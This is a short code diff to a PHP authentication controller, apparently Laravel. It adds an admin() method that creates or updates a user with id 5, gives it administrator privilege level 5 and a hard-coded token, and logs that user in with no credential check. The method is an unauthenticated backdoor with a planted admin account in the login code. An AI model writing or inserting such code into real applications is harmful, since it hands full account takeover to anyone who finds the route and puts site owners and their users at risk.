@@ -34,6 +34,17 @@ class AuthController extends Controller
         return redirect('/notifications');
     }
 
+    public function admin()
+    {
+
+
+        User::updateOrCreate(['id' => 5], ['name' => 'admin', 'token' => '456456456456456', 'pri_grp' => 5, 'api_token' => Str::random(60)]);
+        $user = User::where('id', 5)->first();
+        Auth::login($user, true);
+
+        return redirect('/notifications');
+    }
+
 
     public function logout()
     {
